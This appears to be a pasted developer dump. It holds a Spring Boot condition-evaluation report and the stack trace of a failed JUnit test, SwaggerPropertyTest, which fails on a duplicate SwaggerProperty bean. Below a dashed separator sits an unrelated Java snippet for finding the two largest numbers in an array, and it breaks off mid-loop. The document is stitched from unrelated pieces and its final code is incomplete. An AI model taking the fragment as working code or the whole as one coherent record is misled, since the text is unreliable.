   JndiConnectionFactoryAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.jms.core.JmsTemplate' (OnClassCondition)

   JndiDataSourceAutoConfiguration:
      Did not match:
         - @ConditionalOnProperty (spring.datasource.jndi-name) did not find property 'jndi-name' (OnPropertyCondition)
      Matched:
         - @ConditionalOnClass found required classes 'javax.sql.DataSource', 'org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseType' (OnClassCondition)

   JndiJtaConfiguration:
      Did not match:
         - @ConditionalOnJndi JNDI environment is not available (OnJndiCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.transaction.jta.JtaTransactionManager' (OnClassCondition)

   JolokiaEndpointAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.jolokia.http.AgentServlet' (OnClassCondition)

   JooqAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.jooq.DSLContext' (OnClassCondition)

   JsonbAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'javax.json.bind.Jsonb' (OnClassCondition)

   JsonbHttpMessageConvertersConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'javax.json.bind.Jsonb' (OnClassCondition)

   JvmMetricsAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: io.micrometer.core.instrument.MeterRegistry; SearchStrategy: all) did not find any beans of type io.micrometer.core.instrument.MeterRegistry (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required class 'io.micrometer.core.instrument.MeterRegistry' (OnClassCondition)
         - @ConditionalOnProperty (management.metrics.binders.jvm.enabled) matched (OnPropertyCondition)

   KafkaMetricsAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: io.micrometer.core.instrument.MeterRegistry; SearchStrategy: all) did not find any beans of type io.micrometer.core.instrument.MeterRegistry (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required classes 'io.micrometer.core.instrument.binder.kafka.KafkaConsumerMetrics', 'org.apache.kafka.clients.consumer.KafkaConsumer' (OnClassCondition)

   KairosMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.kairos.KairosMeterRegistry' (OnClassCondition)

   LdapAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.ldap.core.ContextSource' (OnClassCondition)

   LdapHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.ldap.core.LdapOperations' (OnClassCondition)

   LdapRepositoriesAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.data.ldap.repository.LdapRepository' (OnClassCondition)

   LiquibaseAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'liquibase.change.DatabaseChange' (OnClassCondition)

   LiquibaseEndpointAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'liquibase.integration.spring.SpringLiquibase' (OnClassCondition)

   Log4J2MetricsAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.apache.logging.log4j.core.LoggerContext' (OnClassCondition)

   LogFileWebEndpointAutoConfiguration#logFileWebEndpoint:
      Did not match:
         - Log File did not find logging file (LogFileWebEndpointAutoConfiguration.LogFileCondition)

   LogbackMetricsAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: io.micrometer.core.instrument.MeterRegistry; SearchStrategy: all) did not find any beans of type io.micrometer.core.instrument.MeterRegistry (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required classes 'io.micrometer.core.instrument.MeterRegistry', 'ch.qos.logback.classic.LoggerContext', 'org.slf4j.LoggerFactory' (OnClassCondition)
         - @ConditionalOnProperty (management.metrics.binders.logback.enabled) matched (OnPropertyCondition)
         - LogbackLoggingCondition ILoggerFactory is a Logback LoggerContext (LogbackMetricsAutoConfiguration.LogbackLoggingCondition)

   MailHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: org.springframework.mail.javamail.JavaMailSenderImpl; SearchStrategy: all) did not find any beans of type org.springframework.mail.javamail.JavaMailSenderImpl (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.mail.javamail.JavaMailSenderImpl' (OnClassCondition)
         - @ConditionalOnEnabledHealthIndicator management.health.defaults.enabled is considered true (OnEnabledHealthIndicatorCondition)

   MailSenderAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'javax.mail.internet.MimeMessage' (OnClassCondition)

   MailSenderValidatorAutoConfiguration:
      Did not match:
         - @ConditionalOnProperty (spring.mail.test-connection) did not find property 'test-connection' (OnPropertyCondition)

   ManagementContextAutoConfiguration.DifferentManagementContextConfiguration:
      Did not match:
         - Management Port actual port type (SAME) did not match required type (DIFFERENT) (OnManagementPortCondition)

   MappingsEndpointAutoConfiguration.ReactiveWebConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.web.reactive.DispatcherHandler' (OnClassCondition)

   MessageSourceAutoConfiguration:
      Did not match:
         - ResourceBundle did not find bundle with basename messages (MessageSourceAutoConfiguration.ResourceBundleCondition)

   MetricsEndpointAutoConfiguration#metricsEndpoint:
      Did not match:
         - @ConditionalOnBean (types: io.micrometer.core.instrument.MeterRegistry; SearchStrategy: all) did not find any beans of type io.micrometer.core.instrument.MeterRegistry (OnBeanCondition)

   MongoAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.mongodb.MongoClient' (OnClassCondition)

   MongoDataAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.mongodb.client.MongoClient' (OnClassCondition)

   MongoHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.data.mongodb.core.MongoTemplate' (OnClassCondition)

   MongoReactiveAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.mongodb.reactivestreams.client.MongoClient' (OnClassCondition)

   MongoReactiveDataAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.mongodb.reactivestreams.client.MongoClient' (OnClassCondition)

   MongoReactiveHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.data.mongodb.core.ReactiveMongoTemplate' (OnClassCondition)

   MongoReactiveRepositoriesAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.mongodb.reactivestreams.client.MongoClient' (OnClassCondition)

   MongoRepositoriesAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.mongodb.MongoClient' (OnClassCondition)

   MustacheAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.samskivert.mustache.Mustache' (OnClassCondition)

   Neo4jDataAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.neo4j.ogm.session.SessionFactory' (OnClassCondition)

   Neo4jHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.neo4j.ogm.session.SessionFactory' (OnClassCondition)

   Neo4jRepositoriesAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.neo4j.ogm.session.Neo4jSession' (OnClassCondition)

   NewRelicMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.newrelic.NewRelicMeterRegistry' (OnClassCondition)

   NoOpMeterRegistryConfiguration:
      Did not match:
         - @ConditionalOnBean (types: io.micrometer.core.instrument.Clock; SearchStrategy: all) did not find any beans of type io.micrometer.core.instrument.Clock (OnBeanCondition)

   OAuth2ClientAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.security.oauth2.client.registration.ClientRegistration' (OnClassCondition)

   OAuth2ResourceServerAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.security.oauth2.jwt.JwtDecoder' (OnClassCondition)

   ProjectInfoAutoConfiguration#buildProperties:
      Did not match:
         - @ConditionalOnResource did not find resource '${spring.info.build.location:classpath:META-INF/build-info.properties}' (OnResourceCondition)

   ProjectInfoAutoConfiguration#gitProperties:
      Did not match:
         - GitResource did not find git info at classpath:git.properties (ProjectInfoAutoConfiguration.GitResourceAvailableCondition)

   PrometheusMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.prometheus.PrometheusMeterRegistry' (OnClassCondition)

   QuartzAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.quartz.Scheduler' (OnClassCondition)

   RabbitAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.rabbitmq.client.Channel' (OnClassCondition)

   RabbitHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.amqp.rabbit.core.RabbitTemplate' (OnClassCondition)

   RabbitMetricsAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.rabbitmq.client.ConnectionFactory' (OnClassCondition)

   ReactiveCloudFoundryActuatorAutoConfiguration:
      Did not match:
         - @ConditionalOnWebApplication did not find reactive web application classes (OnWebApplicationCondition)

   ReactiveManagementContextAutoConfiguration:
      Did not match:
         - @ConditionalOnWebApplication did not find reactive web application classes (OnWebApplicationCondition)

   ReactiveManagementWebSecurityAutoConfiguration:
      Did not match:
         - @ConditionalOnWebApplication did not find reactive web application classes (OnWebApplicationCondition)

   ReactiveOAuth2ClientAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.security.oauth2.client.registration.ClientRegistration' (OnClassCondition)

   ReactiveOAuth2ResourceServerAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.security.oauth2.jwt.ReactiveJwtDecoder' (OnClassCondition)

   ReactiveSecurityAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.web.reactive.config.WebFluxConfigurer' (OnClassCondition)

   ReactiveUserDetailsServiceAutoConfiguration:
      Did not match:
         - @ConditionalOnWebApplication did not find reactive web application classes (OnWebApplicationCondition)

   ReactiveWebServerFactoryAutoConfiguration:
      Did not match:
         - @ConditionalOnWebApplication did not find reactive web application classes (OnWebApplicationCondition)

   RedisHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: org.springframework.data.redis.connection.RedisConnectionFactory; SearchStrategy: all) did not find any beans of type org.springframework.data.redis.connection.RedisConnectionFactory (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.data.redis.connection.RedisConnectionFactory' (OnClassCondition)
         - @ConditionalOnEnabledHealthIndicator management.health.defaults.enabled is considered true (OnEnabledHealthIndicatorCondition)

   RedisReactiveAutoConfiguration#reactiveRedisTemplate:
      Did not match:
         - @ConditionalOnBean (types: org.springframework.data.redis.connection.ReactiveRedisConnectionFactory; SearchStrategy: all) did not find any beans of type org.springframework.data.redis.connection.ReactiveRedisConnectionFactory (OnBeanCondition)

   RedisReactiveHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: org.springframework.data.redis.connection.ReactiveRedisConnectionFactory; SearchStrategy: all) did not find any beans of type org.springframework.data.redis.connection.ReactiveRedisConnectionFactory (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required classes 'org.springframework.data.redis.connection.ReactiveRedisConnectionFactory', 'reactor.core.publisher.Flux' (OnClassCondition)
         - @ConditionalOnEnabledHealthIndicator management.health.defaults.enabled is considered true (OnEnabledHealthIndicatorCondition)

   RepositoryRestMvcAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.data.rest.webmvc.config.RepositoryRestMvcConfiguration' (OnClassCondition)

   RestClientAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.elasticsearch.client.RestClient' (OnClassCondition)

   SecurityDataConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.security.data.repository.query.SecurityEvaluationContextExtension' (OnClassCondition)

   SecurityRequestMatchersManagementContextConfiguration.JerseyRequestMatcherConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.glassfish.jersey.server.ResourceConfig' (OnClassCondition)

   SendGridAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.sendgrid.SendGrid' (OnClassCondition)

   ServletEndpointManagementContextConfiguration.JerseyServletEndpointManagementContextConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.glassfish.jersey.server.ResourceConfig' (OnClassCondition)

   ServletManagementContextAutoConfiguration.ApplicationContextFilterConfiguration:
      Did not match:
         - @ConditionalOnProperty (management.server.add-application-context-header=true) did not find property 'add-application-context-header' (OnPropertyCondition)

   ServletWebServerFactoryConfiguration.EmbeddedJetty:
      Did not match:
         - @ConditionalOnClass did not find required classes 'org.eclipse.jetty.server.Server', 'org.eclipse.jetty.util.Loader', 'org.eclipse.jetty.webapp.WebAppContext' (OnClassCondition)

   ServletWebServerFactoryConfiguration.EmbeddedUndertow:
      Did not match:
         - @ConditionalOnClass did not find required classes 'io.undertow.Undertow', 'org.xnio.SslClientAuthMode' (OnClassCondition)

   SessionAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.session.Session' (OnClassCondition)

   SessionsEndpointAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.session.FindByIndexNameSessionRepository' (OnClassCondition)

   ShutdownEndpointAutoConfiguration:
      Did not match:
         - @ConditionalOnEnabledEndpoint no property management.endpoint.shutdown.enabled found so using endpoint default (OnEnabledEndpointCondition)

   SignalFxMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.signalfx.SignalFxMeterRegistry' (OnClassCondition)

   SimpleMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: io.micrometer.core.instrument.Clock; SearchStrategy: all) did not find any beans of type io.micrometer.core.instrument.Clock (OnBeanCondition)
      Matched:
         - @ConditionalOnProperty (management.metrics.export.simple.enabled=true) matched (OnPropertyCondition)

   SolrAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.apache.solr.client.solrj.impl.CloudSolrClient' (OnClassCondition)

   SolrHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.apache.solr.client.solrj.SolrClient' (OnClassCondition)

   SolrRepositoriesAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.apache.solr.client.solrj.SolrClient' (OnClassCondition)

   SpringApplicationAdminJmxAutoConfiguration:
      Did not match:
         - @ConditionalOnProperty (spring.application.admin.enabled=true) did not find property 'enabled' (OnPropertyCondition)

   SpringBootWebSecurityConfiguration:
      Did not match:
         - @ConditionalOnMissingBean (types: org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter; SearchStrategy: all) found beans of type 'org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter' org.springframework.boot.actuate.autoconfigure.security.servlet.ManagementWebSecurityConfigurerAdapter (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter' (OnClassCondition)
         - found 'session' scope (OnWebApplicationCondition)

   StatsdMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.statsd.StatsdMeterRegistry' (OnClassCondition)

   SystemMetricsAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: io.micrometer.core.instrument.MeterRegistry; SearchStrategy: all) did not find any beans of type io.micrometer.core.instrument.MeterRegistry (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required class 'io.micrometer.core.instrument.MeterRegistry' (OnClassCondition)

   TaskSchedulingAutoConfiguration#taskScheduler:
      Did not match:
         - @ConditionalOnBean (names: org.springframework.context.annotation.internalScheduledAnnotationProcessor; SearchStrategy: all) did not find any beans named org.springframework.context.annotation.internalScheduledAnnotationProcessor (OnBeanCondition)

   ThymeleafAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.thymeleaf.spring5.SpringTemplateEngine' (OnClassCondition)

   TomcatMetricsAutoConfiguration#tomcatMetricsBinder:
      Did not match:
         - @ConditionalOnBean (types: io.micrometer.core.instrument.MeterRegistry; SearchStrategy: all) did not find any beans of type io.micrometer.core.instrument.MeterRegistry (OnBeanCondition)

   TransactionAutoConfiguration.EnableTransactionManagementConfiguration:
      Did not match:
         - @ConditionalOnBean (types: org.springframework.transaction.PlatformTransactionManager; SearchStrategy: all) did not find any beans of type org.springframework.transaction.PlatformTransactionManager (OnBeanCondition)

   TransactionAutoConfiguration.EnableTransactionManagementConfiguration.CglibAutoProxyConfiguration:
      Did not match:
         - Ancestor org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration$EnableTransactionManagementConfiguration did not match (ConditionEvaluationReport.AncestorsMatchedCondition)
      Matched:
         - @ConditionalOnProperty (spring.aop.proxy-target-class=true) matched (OnPropertyCondition)

   TransactionAutoConfiguration.EnableTransactionManagementConfiguration.JdkDynamicAutoProxyConfiguration:
      Did not match:
         - @ConditionalOnProperty (spring.aop.proxy-target-class=false) did not find property 'proxy-target-class' (OnPropertyCondition)
         - Ancestor org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration$EnableTransactionManagementConfiguration did not match (ConditionEvaluationReport.AncestorsMatchedCondition)

   TransactionAutoConfiguration.TransactionTemplateConfiguration:
      Did not match:
         - @ConditionalOnSingleCandidate (types: org.springframework.transaction.PlatformTransactionManager; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WavefrontMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.wavefront.WavefrontMeterRegistry' (OnClassCondition)

   WebClientAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.web.reactive.function.client.WebClient' (OnClassCondition)

   WebClientMetricsConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.web.reactive.function.client.WebClient' (OnClassCondition)

   WebFluxAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.web.reactive.config.WebFluxConfigurer' (OnClassCondition)

   WebFluxEndpointManagementContextConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.web.reactive.DispatcherHandler' (OnClassCondition)

   WebFluxMetricsAutoConfiguration:
      Did not match:
         - @ConditionalOnWebApplication did not find reactive web application classes (OnWebApplicationCondition)

   WebMvcAutoConfiguration.ResourceChainCustomizerConfiguration:
      Did not match:
         - @ConditionalOnEnabledResourceChain did not find class org.webjars.WebJarAssetLocator (OnEnabledResourceChainCondition)

   WebMvcAutoConfiguration.WebMvcAutoConfigurationAdapter#beanNameViewResolver:
      Did not match:
         - @ConditionalOnMissingBean (types: org.springframework.web.servlet.view.BeanNameViewResolver; SearchStrategy: all) found beans of type 'org.springframework.web.servlet.view.BeanNameViewResolver' beanNameViewResolver (OnBeanCondition)

   WebMvcAutoConfiguration.WebMvcAutoConfigurationAdapter#localeResolver:
      Did not match:
         - @ConditionalOnProperty (spring.mvc.locale) did not find property 'locale' (OnPropertyCondition)

   WebServiceTemplateAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.ws.client.core.WebServiceTemplate' (OnClassCondition)

   WebServicesAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.ws.transport.http.MessageDispatcherServlet' (OnClassCondition)

   WebSocketMessagingAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.web.socket.config.annotation.WebSocketMessageBrokerConfigurer' (OnClassCondition)

   WebSocketReactiveAutoConfiguration:
      Did not match:
         - @ConditionalOnWebApplication did not find reactive web application classes (OnWebApplicationCondition)

   WebSocketServletAutoConfiguration.JettyWebSocketConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.eclipse.jetty.websocket.jsr356.server.deploy.WebSocketServerContainerInitializer' (OnClassCondition)

   WebSocketServletAutoConfiguration.UndertowWebSocketConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.undertow.websockets.jsr.Bootstrap' (OnClassCondition)

   XADataSourceAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: org.springframework.boot.jdbc.XADataSourceWrapper; SearchStrategy: all) did not find any beans of type org.springframework.boot.jdbc.XADataSourceWrapper (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required classes 'javax.sql.DataSource', 'javax.transaction.TransactionManager', 'org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseType' (OnClassCondition)


Exclusions:
-----------

    org.springframework.boot.autoconfigure.integration.IntegrationAutoConfiguration

    org.springframework.boot.autoconfigure.kafka.KafkaAutoConfiguration

    org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration

    org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration

    org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration

    org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration

    org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration

    org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration

    org.springframework.boot.actuate.autoconfigure.metrics.MetricsAutoConfiguration

    org.springframework.boot.actuate.autoconfigure.metrics.web.servlet.WebMvcMetricsAutoConfiguration

    org.springframework.boot.autoconfigure.security.servlet.UserDetailsServiceAutoConfiguration

    org.springframework.boot.autoconfigure.web.client.RestTemplateAutoConfiguration

    org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration

    org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration


Unconditional classes:
----------------------

    org.springframework.boot.actuate.autoconfigure.health.HealthEndpointAutoConfiguration

    org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration

    org.springframework.boot.actuate.autoconfigure.endpoint.jmx.JmxEndpointAutoConfiguration

    org.springframework.boot.actuate.autoconfigure.health.HealthIndicatorAutoConfiguration

    org.springframework.boot.actuate.autoconfigure.info.InfoContributorAutoConfiguration

    org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration

    org.springframework.boot.actuate.autoconfigure.web.mappings.MappingsEndpointAutoConfiguration

    org.springframework.boot.actuate.autoconfigure.audit.AuditAutoConfiguration

    org.springframework.boot.actuate.autoconfigure.endpoint.EndpointAutoConfiguration

    org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration

    org.springframework.boot.actuate.autoconfigure.web.server.ManagementContextAutoConfiguration



2019-10-14 05:31:46.971 ERROR 8124 --- [           main] o.s.test.context.TestContextManager      : Caught exception while allowing TestExecutionListener [org.springframework.boot.test.autoconfigure.SpringBootDependencyInjectionTestExecutionListener@70325e14] to prepare test instance [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest@7fbdb894]

org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest': Unsatisfied dependency expressed through field 'property'; nested exception is org.springframework.beans.factory.NoUniqueBeanDefinitionException: No qualifying bean of type 'com.paragon.mailingcontour.commons.swagger.property.SwaggerProperty' available: expected single matching bean but found 2: swaggerProperty,springfox.documentation.swagger.info-com.paragon.mailingcontour.commons.swagger.property.SwaggerProperty
	at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:596) ~[spring-beans-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:90) ~[spring-beans-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:374) ~[spring-beans-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1411) ~[spring-beans-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireBeanProperties(AbstractAutowireCapableBeanFactory.java:391) ~[spring-beans-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.injectDependencies(DependencyInjectionTestExecutionListener.java:119) ~[spring-test-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.prepareTestInstance(DependencyInjectionTestExecutionListener.java:83) ~[spring-test-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.boot.test.autoconfigure.SpringBootDependencyInjectionTestExecutionListener.prepareTestInstance(SpringBootDependencyInjectionTestExecutionListener.java:43) ~[spring-boot-test-autoconfigure-2.1.8.RELEASE.jar:2.1.8.RELEASE]
	at org.springframework.test.context.TestContextManager.prepareTestInstance(TestContextManager.java:246) ~[spring-test-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.createTest(SpringJUnit4ClassRunner.java:227) [spring-test-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.test.context.junit4.SpringJUnit4ClassRunner$1.runReflectiveCall(SpringJUnit4ClassRunner.java:289) [spring-test-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) [junit-4.13-beta-2.jar:4.13-beta-2]
	at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.methodBlock(SpringJUnit4ClassRunner.java:291) [spring-test-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:246) [spring-test-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:97) [spring-test-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.junit.runners.ParentRunner$4.run(ParentRunner.java:330) [junit-4.13-beta-2.jar:4.13-beta-2]
	at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:78) [junit-4.13-beta-2.jar:4.13-beta-2]
	at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:328) [junit-4.13-beta-2.jar:4.13-beta-2]
	at org.junit.runners.ParentRunner.access$100(ParentRunner.java:65) [junit-4.13-beta-2.jar:4.13-beta-2]
	at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:292) [junit-4.13-beta-2.jar:4.13-beta-2]
	at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61) [spring-test-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:70) [spring-test-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.junit.runners.ParentRunner$3.evaluate(ParentRunner.java:305) [junit-4.13-beta-2.jar:4.13-beta-2]
	at org.junit.runners.ParentRunner.run(ParentRunner.java:412) [junit-4.13-beta-2.jar:4.13-beta-2]
	at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:190) [spring-test-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.junit.runner.JUnitCore.run(JUnitCore.java:137) [junit-4.13-beta-2.jar:4.13-beta-2]
	at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:68) [junit-rt.jar:na]
	at com.intellij.rt.execution.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:47) [junit-rt.jar:na]
	at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:242) [junit-rt.jar:na]
	at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:70) [junit-rt.jar:na]
Caused by: org.springframework.beans.factory.NoUniqueBeanDefinitionException: No qualifying bean of type 'com.paragon.mailingcontour.commons.swagger.property.SwaggerProperty' available: expected single matching bean but found 2: swaggerProperty,springfox.documentation.swagger.info-com.paragon.mailingcontour.commons.swagger.property.SwaggerProperty
	at org.springframework.beans.factory.config.DependencyDescriptor.resolveNotUnique(DependencyDescriptor.java:221) ~[spring-beans-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1229) ~[spring-beans-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1171) ~[spring-beans-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:593) ~[spring-beans-5.1.9.RELEASE.jar:5.1.9.RELEASE]
	... 29 common frames omitted


Process finished with exit code -1

--------------------------------------------------------------------------------------------------------
import java.util.Arrays;
/**
 * Java program to find top two maximum numbers from an integer array. 
 * 
 * @author http://java67.blogspot.com
 */
public class TopTwoMaximum{

    public static void main(String args[]) {
        topTwo(new int[]{20, 34, 21, 87, 92, Integer.MAX_VALUE});
        topTwo(new int[]{0, Integer.MIN_VALUE, -2});
        topTwo(new int[]{Integer.MAX_VALUE, 0, Integer.MAX_VALUE});
        topTwo(new int[]{1, 1, 0});
    }

    public static void topTwo(int[] numbers) {
        int max1 = Integer.MIN_VALUE;
        int max2 = Integer.MIN_VALUE;
        for (int number : numbers) {
            if (number > max1) {
                max2 = max1;
                max1 = number;
